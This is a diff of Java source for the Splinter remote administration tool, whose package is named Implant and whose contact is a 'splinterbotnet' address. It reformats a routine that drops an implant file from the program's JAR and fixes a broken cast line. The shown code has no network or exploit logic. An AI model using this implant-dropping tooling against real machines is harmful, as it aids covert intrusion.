@@ -6,6 +6,8 @@
 	Splinter - The RAT (Remote Administrator Tool)
 	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
 	Copyright 2013 Solomon Sonya
+	
+	This copyright applies to the entire Splinter Project and all relating source code
 
 	This program is free software: you are free to  redistribute 
     it under the terms of the GNU General Public License as published by
@@ -45,6 +47,7 @@
 	Email	--> splinterbotnet@gmail.com
 	GitHub	--> https://github.com/splinterbotnet
 **/
+
 
 
 package Implant;
@@ -333,7 +336,7 @@ public class Driver
   {
     try
     {
-      long rand = ()(Math.random() * 900000.0D);
+    	long rand = (long) (Math.random() * Drivers.MAX_THREAD_COUNT);
 
       if (alRandomUniqueImplantIDs.contains(Long.valueOf(rand)))
       {
@@ -366,79 +369,89 @@ public class Driver
   }
 
   public static boolean dropImplantFile(String pathInJAR_To_Extract, String implantName_And_Extension)
-  {
-    URL url_Dropper = Splinter_GUI.class.getResource(pathInJAR_To_Extract);
-    try
-    {
-      if ((url_Dropper == null) || (url_Dropper.toString().trim().equals("")))
-      {
-        String errorMsg = "* * * ERROR --> " + pathInJAR_To_Extract + " does not exist within this image file!!!!!  I am Unable to process drop request";
-        sop(errorMsg);
+	{
+		
+		java.net.URL url_Dropper = Splinter_GUI.class.getResource(pathInJAR_To_Extract);
+		
+		
+		
+		try
+		{			
+			
+			if(url_Dropper == null || url_Dropper.toString().trim().equals(""))
+			{
+				String errorMsg = "* * * ERROR --> " + pathInJAR_To_Extract + " does not exist within this image file!!!!!  I am Unable to process drop request";
+				Driver.sop(errorMsg);
+				
+				return false;
+			}
+			
+			File dropDirectory = Driver.querySelectFile(false, "Please Select the Directory to drop the implant", JFileChooser.DIRECTORIES_ONLY, false, false);
 
-        return false;
-      }
-
-      File dropDirectory = querySelectFile(false, "Please Select the Directory to drop the implant", 1, false, false);
-
-      if ((dropDirectory != null) && (dropDirectory.isDirectory()) && (dropDirectory.exists()))
-      {
-        File implantOutFile = null;
-
-        if (dropDirectory.getCanonicalPath().trim().endsWith(fileSeperator))
-        {
-          implantOutFile = new File(dropDirectory.getCanonicalFile() + implantName_And_Extension);
-        }
-        else
-        {
-          implantOutFile = new File(dropDirectory.getCanonicalFile() + fileSeperator + implantName_And_Extension);
-        }
-
-        InputStream isIn = Driver.class.getResourceAsStream(pathInJAR_To_Extract);
-        FileOutputStream osOut = new FileOutputStream(implantOutFile);
-
-        int bufferSize = 4096;
-        int totalBytesWritten = 0;
-        byte[] buffer = new byte[bufferSize];
-        int bytesReadFromBuffer;
-        while ((bytesReadFromBuffer = isIn.read(buffer, 0, bufferSize)) > 0)
-        {
-          int bytesReadFromBuffer;
-          osOut.write(buffer, 0, bytesReadFromBuffer);
-          totalBytesWritten += bytesReadFromBuffer;
-        }
-
-        isIn.close();
-        osOut.close();
-
-        sop("Implant Extraction successful!!!  total bytes written: " + getFormattedFileSize_String(totalBytesWritten) + "  --> Saved at " + implantOutFile.getCanonicalPath());
-      }
-      else
-      {
-        sop("No directory selected to drop implant file.");
-        return false;
-      }
-
-      return true;
-    }
-    catch (FileNotFoundException fnfe)
-    {
-      try
-      {
-        sop(" ERROR!!! --> Unable to save to location: " + new File(url_Dropper.toURI()).getCanonicalPath() + " <-- Perhaps this location is restricted, or Access is Denied!  Please try a different location");
-      }
-      catch (Exception ee)
-      {
-        sop("NOPE!!! --> Unable to save to location.  Perhaps this location is restricted, or Access is Denied!  Please try a different location");
-      }
-
-    }
-    catch (Exception e)
-    {
-      eop("dropFile", "Driver", e, e.getLocalizedMessage(), false);
-    }
-
-    return false;
-  }
+			if(dropDirectory != null && dropDirectory.isDirectory() && dropDirectory.exists())
+			{
+				File implantOutFile = null;
+				
+				if(dropDirectory.getCanonicalPath().trim().endsWith(Driver.fileSeperator))
+				{
+					implantOutFile = new File(dropDirectory.getCanonicalFile() + implantName_And_Extension);
+				}
+				else//else, add the seperator between directory and implant file name
+				{
+					implantOutFile = new File(dropDirectory.getCanonicalFile() + Driver.fileSeperator + implantName_And_Extension);
+				}
+				
+				InputStream isIn = (Driver.class.getResourceAsStream(pathInJAR_To_Extract));
+				FileOutputStream osOut = new FileOutputStream(implantOutFile);
+				
+				int bufferSize = 4096;
+				int totalBytesWritten = 0;
+				byte[] buffer = new byte[bufferSize];
+				int bytesReadFromBuffer;
+				while ((bytesReadFromBuffer = isIn.read(buffer, 0, bufferSize)) > 0) 
+				{
+					osOut.write(buffer, 0, bytesReadFromBuffer);
+					totalBytesWritten += bytesReadFromBuffer;
+				}
+				
+				isIn.close();
+				osOut.close();
+				
+				Driver.sop("Implant Extraction successful!!! " + " total bytes written: " + Driver.getFormattedFileSize_String(totalBytesWritten) + "  --> Saved at " + implantOutFile.getCanonicalPath() );
+				
+			}
+			else
+			{
+				Driver.sop("No directory selected to drop implant file.");
+				return false;
+			}
+			
+			
+			
+			
+			return true;
+		}
+		
+		catch(FileNotFoundException fnfe)
+		{
+			try
+			{
+				Driver.sop(" ERROR!!! --> Unable to save to location: " + new File(url_Dropper.toURI()).getCanonicalPath() + " <-- Perhaps this location is restricted, or Access is Denied!  Please try a different location");
+			}
+			catch(Exception ee)
+			{
+				Driver.sop("NOPE!!! --> Unable to save to location.  Perhaps this location is restricted, or Access is Denied!  Please try a different location");
+				
+			}
+		}
+		
+		catch(Exception e)
+		{
+			Driver.eop("dropFile", "Driver", e, e.getLocalizedMessage(), false);
+		}
+		
+		return false;
+	}
 
   public static String getFormattedFileSize_String(String fileSize_bytes)
   {
@@ -498,7 +511,7 @@ public class Driver
 
       Drivers.sop("Unable to determine File Size");
     }
-    return fileSize_bytes;
+    return ""+fileSize_bytes;
   }
 
   public static ArrayList getFilesUnderSelectedDirectory(File fleDirectoryPath, boolean limitFilesTo_ONLY_AcceptableFileExtensions)
